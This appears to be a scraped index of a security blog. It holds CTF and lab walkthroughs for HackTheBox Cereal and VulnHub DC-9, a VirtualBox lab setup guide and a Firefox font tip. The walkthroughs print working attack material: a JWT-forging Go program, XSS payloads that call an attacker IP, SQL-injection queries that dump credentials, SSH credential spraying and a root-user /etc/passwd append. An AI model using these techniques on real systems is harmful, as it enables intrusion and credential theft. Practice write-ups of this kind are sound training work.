return null; // authentication successful so generate jwt token  var tokenHandler = new JwtSecurityTokenHandler(); var key = Encoding.ASCII.GetBytes(\u0026#34;*\u0026#34;); var tokenDescriptor = new SecurityTokenDescriptor { Subject = new ClaimsIdentity(new Claim[] { new Claim(ClaimTypes.Name, user.UserId.ToString()) }), Expires = DateTime.UtcNow.AddDays(7), SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature) }; var token = tokenHandler.CreateToken(tokenDescriptor); user.Token = tokenHandler.WriteToken(token); return user.WithoutPassword(); } When the user attempts to authenticate, the code snippet above checks to see if the user\u0026rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.\nThe user model is defined in here Models/User.cs. From here, I can assume each JWT token contains at least a user\u0026rsquo;s ID, expiration time (7 days), username, and token.\n...\u0026lt;SNIP\u0026gt;... public class User { [Key] public int UserId { get; set; } [Required] public string Username { get; set; } [Required] public string Password { get; set; } public string Token { get; set; } } ...\u0026lt;SNIP\u0026gt;... Interestingly, in ClientApp/src/LoginPage/LoginPage.jsx, the authentication process doesn\u0026rsquo;t look like it needs server/back-end validation, because it checks the browser\u0026rsquo;s local storage first.\n It\u0026rsquo;ll ask the server if we press the login button (POST request).\n ...\u0026lt;SNIP\u0026gt;... import { authenticationService } from \u0026#39;../_services\u0026#39;; // \u0026lt;==  class LoginPage extends React.Component { constructor(props) { super(props); // redirect to home if already logged in  if (authenticationService.currentUserValue) { // \u0026lt;==  this.props.history.push(\u0026#39;/\u0026#39;); } } render() { return ( \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;Login\u0026lt;/h2\u0026gt; ...\u0026lt;SNIP\u0026gt;... I could track the authenticationService.currentUserValue and it is defined in ClientApp/src/_services/authentication.service.jsx\nconst currentUserSubject = new BehaviorSubject(JSON.parse(localStorage.getItem(\u0026#39;currentUser\u0026#39;))); // \u0026lt;==  export const authenticationService = { login, logout, currentUser: currentUserSubject.asObservable(),// \u0026lt;==  get currentUserValue () { return currentUserSubject.value } // \u0026lt;== }; Authentication Bypass I could summarize the previous code analysis to these points:\n As long as the browser\u0026rsquo;s local storage contains a key of currentUser which has JWT token in its value, the client app will logs the user in. No other validation in JWT token except the user\u0026rsquo;s ID and expires date. (based on Services/UserService.cs) Based on Models/User.cs, Services/UserService.cs, and ClientApp/src/_services/auth-header.js , the form of currentUser is something like this:  \u0026quot;currentUser\u0026quot; : \u0026quot;{ \u0026quot;userId\u0026quot;: \u0026quot;0\u0026quot;, \u0026quot;username\u0026quot;: \u0026quot;name\u0026quot;, \u0026quot;token\u0026quot;: \u0026quot;JWT token\u0026quot;}\u0026quot;.    And here are the tactics to bypass the login page:\n Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT. I\u0026rsquo;ll put the forged JWT token to browser\u0026rsquo;s local storage of cereal.htb with the key name of currentUser. Simply refresh the page afterwards and see if it logs me in.  Forge JWT To forge our own JWT, you could try jwtool, but I tried to forge my own JWT using Golang. Here is the code:\npackage main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/dgrijalva/jwt-go\u0026#34; ) type UserService interface { CreateToken(userID string) string } type jwtService struct { secretKey string } func (s *jwtService) CreateToken() string { claims := jwt.StandardClaims{ ExpiresAt: time.Now().AddDate(0, 0, 7).UTC().Unix(), } token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) t, err := token.SignedString([]byte(s.secretKey)) if err != nil { panic(err) } return t } type User struct { UserId string `json:\u0026#34;userId,omitempty\u0026#34;` Username string `json:\u0026#34;username,omitempty\u0026#34;` Token string `json:\u0026#34;token,omitempty\u0026#34;` } func main() { jwt := \u0026amp;jwtService{} jwt.secretKey = \u0026#34;secretlhfIH\u0026amp;FY*#oysuflkhskjfhefesf\u0026#34; cu := User{ UserId: \u0026#34;1\u0026#34;, Username: \u0026#34;iamf\u0026#34;, Token: jwt.CreateToken(), } currentUser, _ := json.Marshal(cu) fmt.Printf(\u0026#34;%s\u0026#34;, currentUser) } It produces the following output.\n→ root@kali «cereal» «10.10.14.3» $ go run main.go {\u0026#34;userId\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;iamf\u0026#34;,\u0026#34;token\u0026#34;:\u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM\u0026#34;} Login At https://cereal.htb, I\u0026rsquo;ll create a new local storage with a key name of currentUser and I\u0026rsquo;ll put the previous output as the key\u0026rsquo;s value. When I refresh the site, it logs me in.\nInput testing When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.\nHere how the request and response looks like.\nSource Code Analysis #2  I decided to mix it with images hehe.\n Deserialization Vulnerability Looking into the request controller, Controllers/RequestsController.cs, it turns out that each Cereal Request (POST) sent is saved in database without validation.\nActually, there is a client-side validation, but it could easily be bypassed with Burp repeater. For example, I could send a cereal request in different structure:\nThe cereal database\u0026rsquo;s name can be found inside CerealContext.cs.\nLooking back into the request controller, there is a comment inside the Get function that points out about deserialization (previously seen upon comparing the commit logs):\n...\u0026lt;SNIP\u0026gt;... [Authorize(Policy = \u0026#34;RestrictIP\u0026#34;)] [HttpGet(\u0026#34;{id}\u0026#34;)] public IActionResult Get(int id) { using (var db = new CerealContext()) { string json = db.Requests.Where(x =\u0026gt; x.RequestId == id).SingleOrDefault().JSON; // Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial  if (json.ToLower().Contains(\u0026#34;objectdataprovider\u0026#34;) || json.ToLower().Contains(\u0026#34;windowsidentity\u0026#34;) || json.ToLower().Contains(\u0026#34;system\u0026#34;)) { return BadRequest(new { message = \u0026#34;The cereal police have been dispatched.\u0026#34; }); } var cereal = JsonConvert.DeserializeObject(json, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.Auto }); return Ok(cereal.ToString()); } } The Get function can only be accessed if the request IP is in the whitelist (defined in appsettings.json ) and it takes one parameter called id (GET /requests/{id}).\n[Authorize(Policy = \u0026#34;RestrictIP\u0026#34;)] [HttpGet(\u0026#34;{id}\u0026#34;)] This line blocks the gadget classes used for .NET deserialization attack.\nif (json.ToLower().Contains(\u0026#34;objectdataprovider\u0026#34;) || json.ToLower().Contains(\u0026#34;windowsidentity\u0026#34;) || json.ToLower().Contains(\u0026#34;system\u0026#34;)) But, there is a class called DownloadHelper that has a function which can be used to send a download request:\n...\u0026lt;SNIP\u0026gt;... public class DownloadHelper { private String _URL; private String _FilePath; public String URL ...\u0026lt;SNIP\u0026gt;... private void Download() { using (WebClient wc = new WebClient()) { if (!string.IsNullOrEmpty(_URL) \u0026amp;\u0026amp; !string.IsNullOrEmpty(_FilePath)) { wc.DownloadFile(_URL, ReplaceLastOccurrence(_FilePath,\u0026#34;\\\\\u0026#34;, \u0026#34;\\\\21098374243-\u0026#34;)); } } } I could use DownloadHelper class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.\nThe problem here I couldn\u0026rsquo;t make a GET request to requests/{id} because there is an IP restriction policy.\nXSS Vulnerability When tracking down where the previous GET request came from, I found out that each Cereal Request sent lands on the admin page (AdminPage.jsx).\nAnd one of the app library used in the admin page called react-marked-down has an XSS vulnerability.\n...\u0026lt;SNIP\u0026gt;... \u0026lt;Accordion.Toggle as={Button} variant=\u0026#34;link\u0026#34; eventKey={this.props.request.requestId} name=\u0026#34;expand\u0026#34; id={this.props.request.requestId}\u0026gt; {requestData \u0026amp;\u0026amp; requestData.title \u0026amp;\u0026amp; typeof requestData.title == \u0026#39;string\u0026#39; \u0026amp;\u0026amp; \u0026lt;MarkdownPreview markedOptions={{ sanitize: true }} value={requestData.title} /\u0026gt; // \u0026lt;== ...\u0026lt;SNIP\u0026gt;... I could confirm the vulnerability with the following payload:\n[XSS](javascript: document.write`\u0026lt;img src='http://10.10.14.3/iamf'/\u0026gt;`) With a few experiments, URL encoding seems to work as well\n[XSS](javascript: document.write%28%22\u0026lt;img src=\u0026#39;http://10.10.14.3/iamf\u0026#39;\u0026gt;%22%29) Foothold Shell as Sonny Web Shell Upload via XSS and Deserialization Putting it all together:\n There is an uploads directory at https://source.cereal.htb/uploads/. The gadget classes for deserialization attack are filtered, but there is one class called DownloadHelper that can be accessed and it has a download function. There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.  The tactics:\n Serialized DownloadHelper class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID. Use XSS which bypasses the IP restriction, to make a GET request to cereal.htb/request/{the ID} to trigger the deserialization, Confirms the web shell at https://cereal.source.htb/uploads/shell-name.aspx  I\u0026rsquo;ve made a script to chain these vulnerabilities (XSS, SSRF, and Deserialization). The results is as follow:\n That\u0026rsquo;s on different IP because I decided to ran the exploit again to make sure it\u0026rsquo;s still work XD\n I can access my web shell on http://source.cereal.htb/uploads/iamf.aspx.\nSSH - sonny A quick check on the web directory, I find the cereal.db at c:\\inetpub\\cereal\\db\\cereal.db and it contains a string that looks like a set of credentials.\nI tried it on SSH (sonny:mutual.madden.manner38974) and it worked.\n→ root@kali «exploits» «10.10.14.2» $ ssh sonny@cereal.htb sonny@cereal.htb\u0026#39;s password: Microsoft Windows [Version 10.0.17763.1817] (c) 2018 Microsoft Corporation. All rights reserved. sonny@CEREAL C:\\Users\\sonny\u0026gt;dir desktop\\ Volume in drive C has no label. Volume Serial Number is C4EF-2153 Directory of C:\\Users\\sonny\\desktop 11/16/2020 05:19 AM \u0026lt;DIR\u0026gt; . 11/16/2020 05:19 AM \u0026lt;DIR\u0026gt; .. 06/07/2021 09:59 PM 34 user.txt 1 File(s) 34 bytes 2 Dir(s) 7,621,619,712 bytes free Privilege Escalation It\u0026rsquo;s retired already.\nReferences  https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0 https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-cereal/","summary":"Cereal is a hard difficulty Windows machine that features a misconfigured web server, which exposes source code of the currently hosted web application. Initial source code analysis revealed a deleted JWT secret that could be used to forge a JWT token and bypass the application\u0026rsquo;s login page. Another code analysis finds the web is vulnerable to a deserialization attack. There is also an XSS vulnerability in one of the packages used by the application.","tags":["Windows","Recover-git","dotNET","Csharp","Code-review","JWT","Golang","Deserialization","XSS","Python"],"title":"HackTheBox - Cereal (User only)"},{"content":"In Firefox, somehow, it renders the font as if it\u0026rsquo;s in high contrast mode or without anti-alias. So in this post, I\u0026rsquo;ll share what I\u0026rsquo;ve found as a workaround to \u0026lsquo;fix\u0026rsquo; that.\nOpen Firefox and type about:config in the address bar.\nSearch for this string.\ngfx.font_rendering.cleartype_params.enhanced_contrast Change the value to 0.\nResult 👇\nIt\u0026rsquo;s not that smooth like in Chrome, but a little bit better 😺.\n","permalink":"https://fahmifj.github.io/blog/font-smoothing-in-firefox/","summary":"In Firefox, somehow, it renders the font as if it\u0026rsquo;s in high contrast mode or without anti-alias. So in this post, I\u0026rsquo;ll share what I\u0026rsquo;ve found as a workaround to \u0026lsquo;fix\u0026rsquo; that.\nOpen Firefox and type about:config in the address bar.\nSearch for this string.\ngfx.font_rendering.cleartype_params.enhanced_contrast Change the value to 0.\nResult 👇\nIt\u0026rsquo;s not that smooth like in Chrome, but a little bit better 😺.","tags":["nanoblog","Firefox"],"title":"Font Smoothing in Firefox"},{"content":"DC-9 from VulnHub features a website that is vulnerable to SQL injection. I’m able to dump a bunch of users’ credentials by leveraging the SQLi and gain a foothold a on the system after spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.\nActually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule. Even though I gained a foothold by skipping the LFI and port knocking, I\u0026rsquo;ll still include the intended way (LFI and port knocking) in the foothold section.\nSkills Learned  Blind SQL injection Local file Inclusion Port knocking  Tools  Nmap Arpscan SQLMap CrackMapExec  Reconnaissance Host Discovery - arp-scan 192.168.2.102 is the target.\n→ root@iamf «dc-9» «192.168.2.103» $ arp-scan --interface eth0 192.168.2.0/24 | tee scans/00-arp-scan Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.2.2 0a:00:27:00:00:0a (Unknown: locally administered) 192.168.2.1 08:00:27:d9:63:87 PCS Systemtechnik GmbH 192.168.2.102 08:00:27:54:bc:fd PCS Systemtechnik GmbH 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 3 responded Port Scan - nmap nmap shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.\n→ root@iamf «dc-9» «192.168.2.103» $ nmap -n -sC -sV -oA scans/10-initial-dc9 \u0026#39;192.168.2.102\u0026#39; -v # Nmap 7.80 scan initiated Thu Apr 8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102 Nmap scan report for 192.168.2.102 Host is up (0.00048s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp filtered ssh 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Example.com - Staff Details - Welcome MAC Address: 08:00:27:54:BC:FD (Oracle VirtualBox virtual NIC) But, later it turns into open state after a full port scan performed.\n→ root@iamf «dc-9» «192.168.2.103» $ nmap -n -p22 192.168.2.102 Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-08 05:21 EDT Nmap scan report for 192.168.2.102 Host is up (0.00075s latency). PORT STATE SERVICE 22/tcp open ssh MAC Address: 08:00:27:54:BC:FD (Oracle VirtualBox virtual NIC) I can confirms it with netcat.\n→ root@iamf «dc-9» «192.168.2.103» $ nc 192.168.2.102 22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 Enumeration TCP 80 - Website The home page of this site doesn\u0026rsquo;t provide anything useful.\nThe Display All Records menu functions to display all user records.\nThere is a user input on the Search menu\nThe Manage menu has login function.\nFrom here I can assume that the website uses database.\nError-based SQL injection - Detection There\u0026rsquo;s error-based SQL injection on search.php. The initial detection is simple, when I try put ' it gives bug (joke reference ).\nI detected the SQLi vulnerability by adding a single quote ( ' ) at the end of user\u0026rsquo;s first name that I want to search.\nBased on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without ', the search should return one related result.\nBut then, if I submit ' OR 1=1 -- -', it returns all the records.\nError-based SQL injection - Database examination There are 6 columns available and the data type of each columns is string. The injection query is as follows:\n\u0026#39; UNION SELECT \u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39; -- I’ll pull out database version, current database, and the available databases using this query:\n\u0026#39; UNION SELECT @@version, \u0026#39;CurrentDB:\u0026#39;, database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- - The website uses MariaDB as its database. The database currently in use is Staff. Staff and users are non-default database, so I\u0026rsquo;ll look into their tables.\nWith the following query, I can get the two tables name from database Staff: StaffDetails and Users.\n\u0026#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = \u0026#39;Staff\u0026#39; -- - StaffDetails contains the all the staff records which previously seen at the Display All Records menu.\nSo, I’ll get the columns on table Users with the following query:\n\u0026#39;UNION SELECT group_concat(column_name), 2,3,4,5,6 from information_schema.columns where table_name = \u0026#39;Users\u0026#39; -- - With the following query, I can get the contents of the Username and Password columns:\n\u0026#39; UNION SELECT group_concat(username, \u0026#39;:\u0026#39;, password),2,3,4,5,6 FROM Users -- - The password is in md5 format.\n→ root@iamf «dc-9» «192.168.2.103» $ echo 856f5de590ef37314e7c3bdf6f8a66dc | wc -c 33 The hash can be cracked online. The credentials is admin:transorbital1, and I’ll just keep that for now.\nOn database users, there is only one table called UserDetails. Here is the query.\n\u0026#39;UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = \u0026#39;users\u0026#39; -- - With the following query, I can get the columns on table UserDetails.\n\u0026#39; UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = \u0026#39;UserDetails\u0026#39; -- - UserDetails has 6 columns, but I\u0026rsquo;m interested only with the username and the password column, and I\u0026rsquo;ll pull out the their contents with the following query.\n\u0026#39; UNION SELECT group_concat(username,\u0026#34;:\u0026#34;,password),2,3,4,5,6 FROM users.UserDetails -- - That\u0026rsquo;s a lot of credentials. I can sort those creds with sed command by substituting comma with new line.\n→ root@iamf «dc-9» «192.168.2.103» $ echo -n \u0026#39;marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC\u0026amp;TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0\u0026#39; | sed -s \u0026#39;s/,/\\n/g\u0026#39; marym:3kfs86sfd julied:468sfdfsd2 fredf:4sfd87sfd1 barneyr:RocksOff tomc:TC\u0026amp;TheBoyz jerrym:B8m#48sd wilmaf:Pebbles bettyr:BamBam01 chandlerb:UrAG0D! joeyt:Passw0rd rachelg:yN72#dsd rossg:ILoveRachel monicag:3248dsds7s phoebeb:smellycats scoots:YR3BVxxxw87 janitor:Ilovepeepee janitor2:Hawaii-Five-0 Foothold Shell as chandlerb, joeyt, janitor SSH Brute-force Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using crackmapexec. It returned 3 valid logins.\n→ root@iamf «dc-9» «192.168.2.103» $ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success SSH 192.168.2.102 22 192.168.2.102 [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 ...\u0026lt;SNIP\u0026gt;... SSH 192.168.2.102 22 192.168.2.102 [+] chandlerb:UrAG0D! SSH 192.168.2.102 22 192.168.2.102 [+] joeyt:Passw0rd ...\u0026lt;SNIP\u0026gt;... SSH 192.168.2.102 22 192.168.2.102 [+] janitor:Ilovepeepee ...\u0026lt;SNIP\u0026gt;... (Intended) LFI and Port Knocking I discovered a LFI on the website after inspecting one of its source code.\nchandlerb@dc-9:/var/www/html$ cat manage.php \u0026lt;?php $file = 'contact-info.php'; $show_errors = $_SESSION['display_errors']; if ($show_errors == 'yes') { if(file_exists($file)) { include($file); } else { echo \u0026quot;File does not exist\u0026quot; . \u0026quot;\u0026lt;br /\u0026gt;\u0026quot;; # LFI vulnerability starts from here $file = $_GET['file']; # No input sanitization poc: manage?file=../../../../etc/passwd include('directory/' . $file); } ...\u0026lt;SNIP\u0026gt;... Using LFI is the intended way to gain a foothold before performing brute force.\n Log into the website using admin:transorbital1.\n With LFI I can include /etc/knockd.conf to read the knocking sequence to open the SSH port.\nIn case the SSH port is closed, then to open it, I\u0026rsquo;ll need to interact with port 7469,8475,9842 sequentially.\nfor i in 7469 8475 9842; do nc -w1 192.168.2.102 $i; done; To close the port, I\u0026rsquo;ll need to knock in reverse order:\nfor i in 9842 8475 7469; do nc -w1 192.168.2.102 $i; done; Then, from here, I should use SSH brute force (which I did earlier).\nPrivilege Escalation Shell as fredf Enumeration Only user janitor that has one valuable thing in its home dir, and that is a password list.\njanitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt BamBam01 Passw0rd smellycats P0Lic#10-4 B4-Tru3-001 4uGU5T-NiGHts With those new password, I\u0026rsquo;ll perform another brute force using crackmapexec.\nSSH - fredf crackmapexec returns one valid login for fred:B4-Tru3-001.\n→ root@iamf «dc-9» «192.168.2.103» $ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success SSH 192.168.2.102 22 192.168.2.102 [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 ... SSH 192.168.2.102 22 192.168.2.102 [+] fredf:B4-Tru3-001 ... → root@iamf «dc-9» «192.168.2.103» $ ssh fredf@192.168.2.102 fredf@192.168.2.102\u0026#39;s password: Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Apr 8 20:10:42 2021 from 192.168.2.103 fredf@dc-9:~$ id uid=1003(fredf) gid=1003(fredf) groups=1003(fredf) Shell as root Sudo privileges - Arbitrary file write User fredf has sudo privileges on a custom binary called test\nfredf@dc-9:/home$ sudo -l Matching Defaults entries for fredf on dc-9: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User fredf may run the following commands on dc-9: (root) NOPASSWD: /opt/devstuff/dist/test/test I suspect /opt/devstuff/test.py is the actual code of that binary.\nfredf@dc-9:/opt/devstuff$ cat test.py #!/usr/bin/python import sys if len (sys.argv) != 3 : print (\u0026#34;Usage: python test.py read append\u0026#34;) sys.exit (1) else : f = open(sys.argv[1], \u0026#34;r\u0026#34;) output = (f.read()) f = open(sys.argv[2], \u0026#34;a\u0026#34;) f.write(output) f.close() Let\u0026rsquo;s break it down.\nIt checks if the arguments are equal to 3. If it doesn\u0026rsquo;t have 3 arguments, it exits.\nif len (sys.argv) != 3 : print (\u0026#34;Usage: python test.py read append\u0026#34;) sys.exit (1) Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable output.\nelse : f = open(sys.argv[1], \u0026#34;r\u0026#34;) output = (f.read()) Then it opens a file specified on argv2 in append mode and it adds the variable output (the file contents of argv1) to that file.\nf = open(sys.argv[2], \u0026#34;a\u0026#34;) f.write(output) f.close() This can be exploited in many ways, and one of them is to add a new root account to /etc/passwd.\nFirst, I\u0026rsquo;ll create a password hash using openssl command.\nfredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123 $1$iamf$lq0NuDAhNy8IFlaFgiRw20 I\u0026rsquo;ll follow the flat database format of /etc/passwd to create my own user. I\u0026rsquo;ll use the field property of root user, and substitute the password (x field) and the username with the one I specified.\nHere is what I mean:\n# From this root:x:0:0:root:/root:/bin/bash # To iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash I\u0026rsquo;ll store that to a file called /tmp/passwd.\nAnd now I can just append the content of /tmp/passwd to /etc/passwd using /opt/devstuff/dist/test/test.\nfredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd I can confirms my account is there (/etc/passwd).\nfredf@dc-9:/tmp$ cat /etc/passwd ... janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash SU - root Now I can switch to my account and get a root shell.\nfredf@dc-9:/tmp$ su iamf Password: pass123 root@dc-9:/tmp# And here is the flag,\nroot@dc-9:~# cat theflag.txt ███╗ ██╗██╗ ██████╗███████╗ ██╗ ██╗ ██████╗ ██████╗ ██╗ ██╗██╗██╗██╗ ████╗ ██║██║██╔════╝██╔════╝ ██║ ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║ ██╔██╗ ██║██║██║ █████╗ ██║ █╗ ██║██║ ██║██████╔╝█████╔╝ ██║██║██║ ██║╚██╗██║██║██║ ██╔══╝ ██║███╗██║██║ ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝ ██║ ╚████║██║╚██████╗███████╗ ╚███╔███╔╝╚██████╔╝██║ ██║██║ ██╗██╗██╗██╗ ╚═╝ ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚══╝╚══╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝╚═╝╚═╝ Congratulations - you have done well to get to this point. Hope you enjoyed DC-9. Just wanted to send out a big thanks to all those who have taken the time to complete the various DC challenges. I also want to send out a big thank you to the various members of @m0tl3ycr3w . They are an inspirational bunch of fellows. Sure, they might smell a bit, but...just kidding. :-) Sadly, all things must come to an end, and this will be the last ever challenge in the DC series. So long, and thanks for all the fish. That\u0026rsquo;s all, thanks for reading.\n References  https://www.vulnhub.com/entry/dc-6,315/ https://crackstation.net/ https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/  ","permalink":"https://fahmifj.github.io/writeups/vulnhub/vh-dc9/","summary":"DC-9 from VulnHub features a website that is vulnerable to SQL injection. I’m able to dump a bunch of users’ credentials by leveraging the SQLi and gain a foothold a on the system after spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.\nActually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.","tags":["OSCP-like","Linux","Port-knocking","SQL-injection","LFI","sudo","Arbitrary-file-write","SQLMap","Openssl"],"title":"VulnHub - DC-9"},{"content":"In this post, I would like to share a quick tutorial (I guess) on how to setup a VulnHub machine in your local network. I’ll assume that you are already familiar with software installation, know what Host OS-Guest OS is, and IP address.\nWhat is VulnHub? VulnHub is a website that provides vulnerable virtual machines (VMs) for those who wants to gain a practical experience in penetration testing. It similar with Hack The Box and TryHackMe, but with VulnHub you can practice locally. Because Windows machine requires a license, most VulnHub machines are Linux server.\nThere are a lot of things you can do with VulnHub machines after you get a root, such as:\n Analyzing the vulnerability, sometimes I patch it if it’s just an insecure code line. Learning how the author configure the server. Building a pentest lab that consists of VulnHub machines to practice network pivoting. DFIR, and many more!  Let\u0026rsquo;s jump in!\nInstall Virtualization Software First thing first, you need a virtualization software such as VirtualBox or VMWare. Here is the links for both software:\n VirtualBox - https://www.virtualbox.org/wiki/Downloads VMWare - https://www.vmware.com/products/workstation-player.html  I personally use VirtualBox (Windows) because it\u0026rsquo;s easy to use (and of course, it\u0026rsquo;s free), but I\u0026rsquo;ll update this post if I got another license of VMWare.\nDownload VM Images / OVA Assuming that you’ve downloaded and installed a VirtualBox, now get your VulnHub machines/VM images at VulnHub’s official site: https://www.vulnhub.com/.\nFor this example, I\u0026rsquo;ll be using symfonos: 2.\nImporting VM Images For the image, if it\u0026rsquo;s on 7z or zip format make sure to decompress it first. In my case symfonos: 2 is on 7z format, so I have to decompress it.\nHere\u0026rsquo;s what I have after decompressing it.\nAny .ovf file should already be associated with VirtualBox, and we can just double click on that file. It\u0026rsquo;ll take us straight to the import menu.\nTo do that manually, open up your VirtualBox then click on the File menu -\u0026gt; select \u0026ldquo;Import Appliance\u0026hellip;\u0026rdquo;, it will pop a new window.\nClick on the icon that I marked with a red box to browse your VM image.\nLocate your VM image and then click on the Open button.\nFor now let\u0026rsquo;s leave all the settings to its default.\nClick on the Import button and wait until it completed.\nWhen the import is done, you will see the machine on the VM list section\nSetting Up VM Network Here is the core part, we\u0026rsquo;ll be putting the VM in an isolated network.\nOpen the VM\u0026rsquo;s settings by right click and choose \u0026ldquo;Settings\u0026rdquo;.\nGo to the Network section, and set the \u0026ldquo;Attached to\u0026rdquo; to Host-only Adapter.\nClick OK button.\nNow open the adapter configuration on the File menu \u0026ndash;\u0026gt; select \u0026ldquo;Host Network Manager\u0026hellip;\u0026rdquo;.\nIn the image below, the “VirtualBox Host-Only Ethernet Adapter” will be using a network range of 192.168.2.0/24 and has DHCP server enabled which is needed by VulnHub machines to obtain IP address automatically on boot.\n192.168.2.2 is the IP address of the virtual adapter on the host side while 192.168.2.1 is the IP address of the built-in DHCP server from VirtualBox.\nBelow is the configuration for the DHCP server.\nI set my Lower Address Bound to 192.168.2.100 and Upper Address Bound to 192.168.2.254, so that all machines will be assigned with an IP started from .100-254, and no one gets 192.168.2.3-99.\nCan I configure it to 10.10.10.0/24?\nYes you can!\nIf we want to create a 10.10.10.0/24 network, it\u0026rsquo;s better to create another adapter by clicking the Create menu (you don\u0026rsquo;t say) then set the adapter\u0026rsquo;s settings with\n IPv4 Address: 10.10.10.2 (Adapter on the host side) IPv4 Network Mask: 255.255.255.0  Next, configure the DHCP server to:\n Server Address: 10.10.10.1 (VirtualBox\u0026rsquo;s built-in DHCP server) Server Mask: 255.255.255.0 Lower Address Bound: 10.10.10.100 Upper Address Bound: 10.10.10.254  Then, on the VM settings (symfonos: 2), change the adapter name with the new one we created before\nLastly, we should also configure the attacking machine, in my case it’s Kali Linux, to use the same network adapter.\nBoot it! Boot your machines and we\u0026rsquo;re done!\nHappy hacking!\n","permalink":"https://fahmifj.github.io/blog/setup-vulnhub-machines/","summary":"In this post, I would like to share a quick tutorial (I guess) on how to setup a VulnHub machine in your local network. I’ll assume that you are already familiar with software installation, know what Host OS-Guest OS is, and IP address.\nWhat is VulnHub? VulnHub is a website that provides vulnerable virtual machines (VMs) for those who wants to gain a practical experience in penetration testing. It similar with Hack The Box and TryHackMe, but with VulnHub you can practice locally.","tags":["Home-lab","VirtualBox","Tutorial"],"title":"Setup VulnHub Machines"},{"content":"DC-6 starts off by enumerating usernames from a WordPress website. I\u0026rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the 